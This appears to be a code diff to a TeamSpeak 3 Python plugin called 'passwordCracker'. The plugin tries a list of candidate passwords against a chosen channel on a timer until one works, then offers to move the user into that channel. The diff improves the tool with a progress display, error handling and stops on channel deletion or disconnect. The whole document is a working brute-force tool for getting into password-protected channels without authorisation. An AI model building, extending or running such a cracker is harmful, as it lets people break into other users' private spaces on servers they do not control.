@@ -55,7 +55,7 @@ class passwordCracker(ts3plugin):
     description = "<insert lenny face here>"
     offersConfigure = False
     commandKeyword = ""
-    infoTitle = None
+    infoTitle = "[b]PW Cracker[/b]"
     menuItems = [(ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL, 0, "Crack PW", ""),
                  (ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL, 1, "Add PW to cracker", ""),
                  (ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 0, "Stop Cracker", ""),
@@ -82,25 +82,41 @@ class passwordCracker(ts3plugin):
         self.timer.timeout.connect(self.tick)
         if self.debug: ts3lib.printMessageToCurrentTab("{0}[color=orange]{1}[/color] Plugin for pyTSon by [url=https://github.com/{2}]{2}[/url] loaded.".format(self.timestamp(),self.name,self.author))
 
+    def infoData(self, schid, id, atype):
+        if not atype == ts3defines.PluginItemType.PLUGIN_CHANNEL: return None
+        if not self.cid == id: return None
+        if not self.schid == schid: return None
+        return ["Trying {0} / {1}".format(self.pwc, len(self.pws))]
+
     def tick(self):
-        self.retcode = ts3lib.createReturnCode()
-        pw = self.pws[self.pwc]
-        err = ts3lib.verifyChannelPassword(self.schid, self.cid, pw, self.retcode)
-        if err != ts3defines.ERROR_ok:
-            (er, msg) = ts3lib.getErrorMessage(err)
-            print('ERROR {0} ({1}) while trying password \"{2}\" for channel #{3} on server #{4}'.format(msg, err, pw, self.cid, self.schid))
-        else: print('[{0}] Trying password \"{1}\" for channel #{2} on server #{3}'.format(self.pwc, pw, self.cid, self.schid))
-        self.pwc += 1
+        try:
+            self.retcode = ts3lib.createReturnCode()
+            if self.pwc >= len(self.pws):
+                self.timer.stop()
+                (err, name) = ts3lib.getChannelVariable(self.schid, self.cid, ts3defines.ChannelProperties.CHANNEL_NAME)
+                msgBox("Password for channel \"{0}\" was not found :(\n\nTried {1} passwords.".format(name, len(self.pws)))
+                self.schid = 0;self.cid = 0;self.pwc = 0;return
+            pw = self.pws[self.pwc]
+            err = ts3lib.verifyChannelPassword(self.schid, self.cid, pw, self.retcode)
+            if err != ts3defines.ERROR_ok:
+                (er, msg) = ts3lib.getErrorMessage(err)
+                print('ERROR {0} ({1}) while trying password \"{2}\" for channel #{3} on server #{4}'.format(msg, err, pw, self.cid, self.schid))
+            else: print('[{0}] Trying password \"{1}\" for channel #{2} on server #{3}'.format(self.pwc, pw, self.cid, self.schid))
+            self.pwc += 1
+        except: from traceback import format_exc;ts3lib.logMessage(format_exc(), ts3defines.LogLevel.LogLevel_ERROR, "pyTSon", 0)
 
     def onServerErrorEvent(self, schid, errorMessage, error, returnCode, extraMessage):
         if not returnCode == self.retcode: return
+        ts3lib.requestInfoUpdate(self.schid, ts3defines.PluginItemType.PLUGIN_CHANNEL, self.cid)
         if not error == ts3defines.ERROR_ok: return 1
         self.timer.stop()
         (err, name) = ts3lib.getChannelVariable(schid, self.cid, ts3defines.ChannelProperties.CHANNEL_NAME)
         if confirm("Password found! ({0} / {1})".format(self.pwc, len(self.pws)), "Password \"{0}\" was found for channel \"{1}\"\n\nDo you want to join now?".format(self.pws[self.pwc-1],name)):
             (err, ownID) = ts3lib.getClientID(self.schid)
             ts3lib.requestClientMove(schid, ownID, self.cid, self.pws[self.pwc-1])
-        self.schid = 0;self.cid = 0;self.pwc = 0;return 1
+        self.schid = 0;self.cid = 0;self.pwc = 0
+        ts3lib.requestInfoUpdate(self.schid, ts3defines.PluginItemType.PLUGIN_CHANNEL, self.cid)
+        return 1
 
     def onMenuItemEvent(self, schid, atype, menuItemID, selectedItemID):
         if atype == ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL:
@@ -158,4 +174,12 @@ class passwordCracker(ts3plugin):
         self.timer.stop()
         (err, name) = ts3lib.getChannelVariable(schid, channelID, ts3defines.ChannelProperties.CHANNEL_NAME)
         msgBox("Channel \"{0}\" got deleted by \"{1}\"\n\nStopping Cracker!".format(name, invokerName), QMessageBox.Warning)
+        self.schid = 0;self.cid = 0;self.pwc = 0;
+
+    def onConnectStatusChangeEvent(self, schid, newStatus, errorNumber):
+        if not newStatus == ts3defines.ConnectStatus.STATUS_DISCONNECTED: return
+        if not self.schid == schid: return
+        self.timer.stop()
+        (err, name) = ts3lib.getChannelVariable(schid, self.cid, ts3defines.ChannelProperties.CHANNEL_NAME)
+        msgBox("Server left\n\nStopping Cracker!", QMessageBox.Warning)
         self.schid = 0;self.cid = 0;self.pwc = 0;
